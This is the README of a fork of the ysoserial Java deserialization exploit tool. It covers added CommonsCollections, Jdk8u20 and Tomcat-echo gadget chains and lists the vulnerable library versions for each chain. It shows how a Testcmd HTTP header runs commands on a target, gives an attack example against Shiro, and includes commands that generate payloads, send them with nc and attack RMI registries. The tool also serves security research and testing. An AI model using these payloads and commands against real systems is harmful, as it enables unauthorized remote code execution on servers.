
# ysoserial

[![Join the chat at https://gitter.im/frohoff/ysoserial](
    https://badges.gitter.im/frohoff/ysoserial.svg)](
    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## Updates By Me:

打包好的 jar 可以直接下载使用: [https://github.com/zema1/ysoserial/releases](https://github.com/zema1/ysoserial/releases)

+ 添加 `CommonsCollectionsK1` (commons-Collections <= 3.2.1 && allowTemplates)
+ 添加 `CommonsCollectionsK2` (commons-Collections == 4.0 && allowTemplates)
+ 添加 `CommonsCollectionsK3` (commons-Collections <= 3.2.1)
+ 添加 `CommonsCollectionsK4` (commons-Collections == 4.0)
+ 添加 `Jdk8u20` （Jdk7u21 的版本延伸 Gadget)
+ 添加 全版本 Tomcat 回显 payload, 自带下列 Gadget，如有需要可以自己组合
    + `CommonsCollectionsK1TomcatEcho`
    + `CommonsCollectionsK2TomcatEcho`
+ 缩减了 Templates 字节码的大小，可以避免超过 tomcat header 大小等。

CommonsCollectionsKx 这 4 条利用链在效果上可以完全代替且超越之前的 CommonsCollection7 条链，
他们以最小的依赖兼顾了 CC 中的各种利用链。其中 K1,K2 是一条链的两个版本，K3,K4 是一条链的两个版本。

Tomcat 回显使用时随便输入一个命令作为占位符即可，真正的命令在 http 请求 header 中指定, 规则如下:
+ Testecho: 123 将在响应 header 回显 Testecho: 123， 可以用于可靠漏洞检测
+ Testcmd: id 将执行 id 命令，并将回显写在响应 body，可以方便的用于命令执行
```
java -jar target/ysoserial-0.0.8-SNAPSHOT-all.jar CommonsCollectionsK1TomcatEcho a > out.bin
```

例如：使用 CommonsCollectionsK1TomcatEcho 打 shiro 1.2.24 的默认环境

![image](https://user-images.githubusercontent.com/20637881/88356652-2275ec80-cd9b-11ea-9746-8888fceb93b4.png)

最后，关于使用方法上，推荐使用 java6 来运行，因为会影响 TemplatesTmpl 最终生成的 payload, 由于 Java 向下兼容，java6 将获得最大兼容性，简易用法如下:
```
JAVA_HOME=/path/to/java6 java -jar target/ysoserial-0.0.8-SNAPSHOT-all.jar
```

## 感谢

+ 有位师傅之前写过一个和 K1 基本一致的链，算是英雄所见略同。 [wh1t3p1g](https://github.com/wh1t3p1g/ysoserial)
+ K3 参考了这位师傅的研究 https://xz.aliyun.com/t/7157
+ Jdk8u20 是这个改进 https://github.com/pwntester/JRE8u20_RCE_Gadget 相比原版非常稳定，paylaod 也更小

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        http://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$ java -jar target/ysoserial-0.0.8-SNAPSHOT-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
Jul 24, 2020 10:48:52 AM org.reflections.Reflections scan
INFO: Reflections took 203 ms to scan 1 urls, producing 17 keys and 172 values
     Payload                        Authors                                Dependencies
     -------                        -------                                ------------
     BeanShell1                     @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                           @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure                        @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1              @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1            @frohoff                               commons-collections:<=3.2.1
     CommonsCollections2            @frohoff                               commons-collections4:4.0
     CommonsCollections3            @frohoff                               commons-collections:<=3.2.1
     CommonsCollections4            @frohoff                               commons-collections4:4.0
     CommonsCollections5            @matthias_kaiser, @jasinner            commons-collections:<=3.2.1
     CommonsCollections6            @matthias_kaiser                       commons-collections:<=3.2.1
     CommonsCollections7            @scristalli, @hanyrax, @EdoardoVignati commons-collections:<=3.2.1
     CommonsCollectionsK1           @koalr                                 commons-collections:<=3.2.1
     CommonsCollectionsK1TomcatEcho @koalr                                 commons-collections:<=3.2.1
     CommonsCollectionsK2           @koalr                                 commons-collections4:4.0
     CommonsCollectionsK2TomcatEcho @koalr                                 commons-collections4:4.0
     CommonsCollectionsK3           @koalr                                 commons-collections:<=3.2.1
     CommonsCollectionsK4           @koalr                                 commons-collections4:4.0
     FileUpload1                    @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1                        @frohoff                               groovy:2.3.9
     Hibernate1                     @mbechler
     Hibernate2                     @mbechler
     JBossInterceptors1             @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient                     @mbechler
     JRMPListener                   @mbechler
     JSON1                          @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1                 @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21                        @frohoff
     Jdk8u20                        @pwntester, @koalr
     Jython1                        @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1                  @matthias_kaiser                       js:1.7R2
     MozillaRhino2                  @_tint0                                js:1.7R2
     Myfaces1                       @mbechler
     Myfaces2                       @mbechler
     ROME                           @mbechler                              rome:1.0
     Spring1                        @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2                        @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS                         @gebl
     Vaadin1                        @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1                        @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```
